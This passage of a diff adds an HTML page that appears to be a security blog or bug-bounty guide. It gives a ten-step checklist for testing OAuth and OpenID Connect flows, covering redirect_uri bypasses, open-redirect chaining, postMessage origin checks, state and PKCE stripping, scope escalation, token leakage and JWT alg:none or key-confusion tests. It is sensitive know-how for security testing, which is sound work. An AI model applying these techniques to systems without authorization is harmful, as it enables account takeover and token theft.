+    <div class="hunt-text"><strong>Map the flow.</strong> Capture full login in Burp. Identify: flow type (<code>code</code> / <code>token</code> / hybrid), all params, endpoints (<code>/auth</code>, <code>/token</code>, <code>/userinfo</code>), confidential vs public client, PKCE presence.</div>
+  </div>
+  <div class="hunt-step">
+    <span class="hunt-num">02</span>
+    <div class="hunt-text"><strong>Attack redirect_uri.</strong> Repeater. Escalate: domain swap → subdomain → path traversal → query injection → encoding → double encoding → param pollution → <code>@</code> character. If strict domain, hunt for open redirects on the client to chain.</div>
+  </div>
+  <div class="hunt-step">
+    <span class="hunt-num">03</span>
+    <div class="hunt-text"><strong>Hunt open redirects.</strong> Spider the client. Params: <code>url</code>, <code>next</code>, <code>path</code>, <code>return</code>, <code>redirect</code>, <code>goto</code>, <code>dest</code>, <code>continue</code>. Test each with an external domain. Low-sev alone — critical when chained with OAuth.</div>
+  </div>
+  <div class="hunt-step">
+    <span class="hunt-num">04</span>
+    <div class="hunt-text"><strong>Grep for postMessage.</strong> Search all JS for <code>postMessage(</code> with <code>'*'</code>. Check <code>addEventListener('message'</code> handlers for missing <code>event.origin</code> validation. Test iframe embeddability of token-handling pages.</div>
+  </div>
+  <div class="hunt-step">
+    <span class="hunt-num">05</span>
+    <div class="hunt-text"><strong>Check state.</strong> Remove <code>state</code>. Reuse old state. Modify it. If callback doesn't reject, the flow is CSRF-vulnerable. Test login CSRF: can you link attacker's OAuth account to victim's session?</div>
+  </div>
+  <div class="hunt-step">
+    <span class="hunt-num">06</span>
+    <div class="hunt-text"><strong>Test PKCE.</strong> Strip <code>code_challenge</code> + <code>code_challenge_method</code>. Server still issues code? Exchange without <code>code_verifier</code>. Try <code>method=plain</code>. PKCE must be enforced, not optional.</div>
+  </div>
+  <div class="hunt-step">
+    <span class="hunt-num">07</span>
+    <div class="hunt-text"><strong>Scope escalation.</strong> Add scopes: <code>scope=openid admin</code>. Does auth server accept? Does resource server independently validate scope per API call, or trust the token blindly?</div>
+  </div>
+  <div class="hunt-step">
+    <span class="hunt-num">08</span>
+    <div class="hunt-text"><strong>Token leakage.</strong> External resources on callback page? Check <code>Referer</code> header. Check <code>Referrer-Policy</code>. Where are tokens stored — <code>localStorage</code>, cookies, session? Are codes single-use + short-lived?</div>
+  </div>
+  <div class="hunt-step">
+    <span class="hunt-num">09</span>
+    <div class="hunt-text"><strong>JWT validation.</strong> For <code>id_token</code>: try <code>alg:none</code>, key confusion (RS256→HS256), expired tokens, wrong <code>aud</code>, wrong <code>iss</code>. Is the signature actually verified? Can you replay old tokens?</div>
+  </div>
+  <div class="hunt-step">
+    <span class="hunt-num">10</span>
+    <div class="hunt-text"><strong>Client secrets in public clients.</strong> Grep APK decompilation and minified JS for <code>client_secret</code>. Mobile apps with custom URI schemes (<code>myapp://</code>) are vulnerable to scheme hijacking — malicious apps register the same scheme.</div>
+  </div>
+  ```
+  
+    </section>
+  
+    <div class="tags">
+      <a class="tag" data-tag="oauth">oauth</a>
+      <a class="tag" data-tag="redirect-uri">redirect-uri</a>
+      <a class="tag" data-tag="token-theft">token-theft</a>
+      <a class="tag" data-tag="postmessage">postmessage</a>
+      <a class="tag" data-tag="open-redirect">open-redirect</a>
+      <a class="tag" data-tag="implicit-flow">implicit-flow</a>
+      <a class="tag" data-tag="pkce">pkce</a>
+      <a class="tag" data-tag="csrf">csrf</a>
+      <a class="tag" data-tag="state-parameter">state-parameter</a>
+      <a class="tag" data-tag="oidc">oidc</a>
+    </div>
+  </main>
+  
+  <script src="https://unpkg.com/prismjs@1.29.0/prism.js" data-manual></script>
+  
+  <script src="https://unpkg.com/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+  
+  <script src="/assets/enhance.js?v=1"></script>
+  
+  <script>if('serviceWorker' in navigator)navigator.serviceWorker.register('/sw.js');</script>
+
+</body>
+</html>
